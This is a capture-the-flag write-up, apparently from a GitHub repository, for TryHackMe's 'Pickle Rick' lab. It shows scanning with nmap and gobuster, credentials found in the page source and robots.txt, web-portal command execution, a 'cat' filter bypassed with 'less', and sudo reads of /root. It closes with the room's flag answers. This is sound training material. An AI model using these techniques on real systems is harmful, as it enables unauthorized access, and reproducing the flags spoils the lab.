# Pickle Rick — TryHackMe

**Date:** May 2026  
**Difficulty:** Easy  
**Category:** Web, Linux  
**Status:** ✅ Completed  

---

## 🔍 Summary
Pickle Rick is an easy TryHackMe room focused on web enumeration and Linux command execution. The objective was to discover hidden credentials, gain access to Rick’s portal, and retrieve the three secret ingredients required to reverse Rick’s pickle experiment.

---

## 🛠️ Tools Used
- Nmap
- Gobuster
- Browser

---

# 📡 Reconnaissance

## Nmap Scan

```bash
nmap -sS -A -T4 MACHINE_IP
```
<img width="835" height="808" alt="Screenshot 2026-05-24 003744" src="https://github.com/user-attachments/assets/cdd3f022-8ca3-48d2-906b-54c32ee681d9" />


### Findings
- Port 22 — SSH
- Port 80 — HTTP

| Port | Service |
|------|---------|
| 22 | SSH |
| 80 | HTTP |

---

## Website Enumeration

Browsing the website revealed a Rick and Morty themed page.

<img width="2555" height="1355" alt="Screenshot 2026-05-24 003846" src="https://github.com/user-attachments/assets/773e49d6-af25-4016-93fa-dc84a77827d3" />

Viewing the page source exposed a hidden username:

```html
Username: R1ckRul3s
```

<img width="1242" height="746" alt="Screenshot 2026-05-24 003905" src="https://github.com/user-attachments/assets/751f1dea-71ae-4ca2-ae47-c61fb20b33ac" />

---


## Gobuster Enumeration

```bash
gobuster dir -u http://MACHINE_IP \
-w /usr/share/wordlists/dirb/common.txt \
-x php,txt,html
```

<img width="829" height="820" alt="Screenshot 2026-05-24 005853" src="https://github.com/user-attachments/assets/a5db21f3-9778-4131-9bbd-c65f98fb199c" />

---

### Directories Found
- /login.php
- /portal.php
- /robots.txt

---

## Robots.txt

Navigating to `/robots.txt` revealed a password:

```text
Wubbalubbadubdub
```

<img width="557" height="249" alt="Screenshot 2026-05-24 010034" src="https://github.com/user-attachments/assets/74731e00-f0a6-4037-add3-13eb2ec4f6ba" />



# 🔓 Exploitation

## Login

Using the discovered credentials:

```text
Username: R1ckRul3s
Password: Wubbalubbadubdub
```

I successfully logged into `/login.php`.

<img width="2556" height="913" alt="Screenshot 2026-05-24 005948" src="https://github.com/user-attachments/assets/74061f49-56f8-488f-a33f-64bc094bb3e8" />


---

## Command Execution

After authentication, the portal provided command execution capabilities.

Testing with:

```bash
ls
```

revealed:

```text
Sup3rS3cretPickl3Ingred.txt
clue.txt
```

<img width="2559" height="506" alt="Screenshot 2026-05-24 010244" src="https://github.com/user-attachments/assets/98a2caed-beef-4091-9214-6767df485c5b" />


---

## First Ingredient

Attempting to use `cat` was blocked:

```bash
cat Sup3rS3cretPickl3Ingred.txt
```

Using `less` bypassed the restriction:

```bash
less Sup3rS3cretPickl3Ingred.txt
```

Output:

```text
mr. meeseek hair
```
<img width="2559" height="506" alt="Screenshot 2026-05-24 010244" src="https://github.com/user-attachments/assets/df33a2f6-e84a-4559-902f-e70836bcc9a3" />

---

## Second Ingredient

Reading the clue:

```bash
less clue.txt
```

The clue suggested searching the filesystem.

Filesystem enumeration:

```bash
ls /
ls /home
ls /home/rick
```

Discovered file:

```text
second ingredients
```

Reading the file:

```bash
less /home/rick/"second ingredients"
```

Output:

```text
1 jerry tear
```

<img width="2559" height="528" alt="Screenshot 2026-05-24 010958" src="https://github.com/user-attachments/assets/c850653c-dff9-4bd4-828a-09d58286d9b4" />


---

## Third Ingredient

Checking the root directory with sudo:

```bash
sudo ls /root
```

Discovered:

```text
3rd.txt
```

Reading the file:

```bash
sudo less /root/"3rd.txt"
```

Output:

```text
fleeb juice
```

<img width="2559" height="498" alt="Screenshot 2026-05-24 011347" src="https://github.com/user-attachments/assets/214d2a2c-98f1-49ec-8aa0-4ee4d23ac2b1" />

---

# 🚩 Flags

| Flag | Location | Value |
|------|----------|-------|
| Flag 1 | Web Directory | `mr. meeseek hair` |
| Flag 2 | /home/rick | `1 jerry tear` |
| Flag 3 | /root | `fleeb juice` |

---
<img width="1627" height="986" alt="Screenshot 2026-05-24 011426" src="https://github.com/user-attachments/assets/9d6b37e7-99c1-4a57-a165-2464ba3f018c" />

# 📚 Lessons Learned

- Practiced web enumeration techniques
- Learned to inspect HTML source code for hidden information
- Used Gobuster for directory brute forcing
- Explored Linux filesystem enumeration
- Learned command restriction bypass techniques
- Reinforced the importance of input sanitization and access control

---
